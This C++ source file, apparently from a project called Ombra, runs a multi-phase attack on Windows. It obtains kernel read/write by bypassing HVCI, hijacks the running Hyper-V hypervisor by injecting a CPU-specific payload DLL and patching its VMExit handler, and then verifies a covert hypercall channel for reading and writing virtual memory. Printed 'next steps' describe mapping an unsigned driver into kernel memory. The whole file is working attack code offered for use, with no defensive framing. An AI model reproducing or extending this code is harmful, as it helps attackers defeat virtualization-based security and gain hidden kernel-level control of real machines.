// Phase 3.1: Hypercall Verification Example
// Demonstrates the complete flow from kernel R/W to verified hypercall communication

#include <Windows.h>
#include <cstdio>
#include <filesystem>
#include "zerohvci.h"
#include "hyperv_hijack.h"
#include "hypercall_verify.h"

namespace fs = std::filesystem;

// Complete Phase 3.0 + 3.1 example
// Shows how to obtain kernel R/W, hijack Hyper-V, inject payload, and verify hypercalls
int main(int argc, char** argv)
{
    printf("========================================\n");
    printf("  Ombra Phase 3.1: Hypercall Verification\n");
    printf("========================================\n\n");

    // -----------------------------------------
    // Phase 1: Obtain Kernel Read/Write
    // -----------------------------------------
    printf("[Phase 1] Obtaining kernel read/write via ZeroHVCI...\n");

    if (!zerohvci::Initialize())
    {
        printf("[-] ZeroHVCI initialization failed\n");
        return -1;
    }

    printf("[+] ZeroHVCI initialized - kernel R/W obtained\n\n");

    // -----------------------------------------
    // Phase 2: Hijack Hyper-V and Inject Payload
    // -----------------------------------------
    printf("[Phase 2] Hijacking Hyper-V runtime...\n");

    zerohvci::hyperv::RuntimeHijacker hijacker;
    if (!hijacker.Initialize())
    {
        printf("[-] RuntimeHijacker initialization failed\n");
        zerohvci::Cleanup();
        return -2;
    }

    // Determine payload path based on CPU vendor
    const char* payload_filename = hijacker.IsIntel() ? "PayLoad-Intel.dll" : "PayLoad-AMD.dll";
    fs::path payload_path = fs::current_path() / payload_filename;

    printf("[*] Target CPU: %s\n", hijacker.IsIntel() ? "Intel (VMX)" : "AMD (SVM)");
    printf("[*] Loading payload from: %s\n", payload_path.string().c_str());

    if (!fs::exists(payload_path))
    {
        printf("[-] Payload not found: %s\n", payload_path.string().c_str());
        zerohvci::Cleanup();
        return -3;
    }

    // Read payload from disk
    std::ifstream payload_file(payload_path, std::ios::binary | std::ios::ate);
    if (!payload_file)
    {
        printf("[-] Failed to open payload file\n");
        zerohvci::Cleanup();
        return -4;
    }

    size_t payload_size = payload_file.tellg();
    payload_file.seekg(0, std::ios::beg);

    std::vector<BYTE> payload_buffer(payload_size);
    if (!payload_file.read(reinterpret_cast<char*>(payload_buffer.data()), payload_size))
    {
        printf("[-] Failed to read payload file\n");
        zerohvci::Cleanup();
        return -5;
    }

    printf("[*] Payload loaded: %zu bytes\n", payload_size);
    printf("[*] Injecting into Hyper-V...\n");

    if (!hijacker.HijackHyperV(payload_buffer.data(), payload_size))
    {
        printf("[-] Hyper-V hijack failed\n");
        zerohvci::Cleanup();
        return -6;
    }

    printf("[+] Hyper-V hijacked successfully\n");
    printf("[+] Payload injected at: 0x%llX\n", hijacker.GetPayloadBase());
    printf("[+] VMExit handler patched at: 0x%llX\n\n", hijacker.GetHyperVInfo().VmExitCallAddr);

    // -----------------------------------------
    // Phase 3: Verify Hypercall Communication
    // -----------------------------------------
    printf("[Phase 3] Verifying hypercall communication...\n");

    uint64_t session_key = zerohvci::hypercall::VerifyHypervisorActive();

    if (session_key == 0)
    {
        printf("[-] Hypercall verification failed\n");
        printf("[-] The payload may not be intercepting CPUID correctly\n");
        zerohvci::Cleanup();
        return -7;
    }

    printf("\n========================================\n");
    printf("  ALL PHASES COMPLETE                  \n");
    printf("========================================\n\n");

    printf("Status:\n");
    printf("  - Kernel R/W: Active\n");
    printf("  - Hyper-V: Hijacked\n");
    printf("  - Payload: Injected at 0x%llX\n", hijacker.GetPayloadBase());
    printf("  - Hypercalls: Verified (session key: 0x%016llX)\n", session_key);
    printf("\n");

    printf("Next Steps:\n");
    printf("  1. Use session_key for all hypercalls (VMCALL_READ_VIRT, VMCALL_WRITE_VIRT, etc)\n");
    printf("  2. Map OmbraDriver.sys into kernel memory\n");
    printf("  3. Register driver callback with VMCALL_STORAGE_QUERY\n");
    printf("\n");

    printf("[!] WARNING: Do not terminate this process\n");
    printf("[!]          Process must remain alive to maintain kernel R/W\n");
    printf("[!]          Reboot to restore original Hyper-V state\n");
    printf("\n");

    // Keep process alive
    printf("Press Enter to cleanup and exit...\n");
    getchar();

    zerohvci::Cleanup();
    return 0;
}

// Minimal example - just verify hypercalls work
// Assumes you've already called RuntimeHijacker.HijackHyperV()
int MinimalVerificationExample()
{
    printf("[*] Testing hypercall communication...\n\n");

    uint64_t session_key = zerohvci::hypercall::VerifyHypervisorActive();

    if (session_key == 0) {
        printf("[-] Hypercall verification failed\n");
        return -1;
    }

    printf("\n[+] Hypercalls working - session key: 0x%016llX\n", session_key);
    return 0;
}

// Manual step-by-step example
// Shows each individual operation for educational purposes
int ManualStepByStepExample()
{
    printf("[*] Manual hypercall verification (step-by-step)\n\n");

    // Step 1: Generate key
    uint64_t key = zerohvci::hypercall::GenerateSessionKey();
    printf("[1/3] Generated session key: 0x%016llX\n", key);
    printf("      (Derived from RDTSC: %llu, PID: %lu)\n", __rdtsc(), GetCurrentProcessId());

    // Step 2: Set key
    printf("[2/3] Calling VMCALL_SET_COMM_KEY...\n");
    if (!zerohvci::hypercall::SetCommunicationKey(key)) {
        printf("      [-] Failed - hypervisor not responding\n");
        return -1;
    }
    printf("      [+] Success - key registered with hypervisor\n");

    // Step 3: Test with CR3 read
    printf("[3/3] Calling VMCALL_GET_CR3 to test communication...\n");
    uint64_t cr3 = 0;
    if (!zerohvci::hypercall::VerifyHypercallWorks(&cr3, key)) {
        printf("      [-] Failed - hypercall not working\n");
        return -1;
    }
    printf("      [+] Success - CR3 value: 0x%016llX\n", cr3);
    printf("      (Page directory base is page-aligned: %s)\n", (cr3 & 0xFFF) == 0 ? "YES" : "NO");

    printf("\n[+] All steps completed successfully\n");
    printf("[+] Hypercall channel is active and authenticated\n");

    return 0;
}
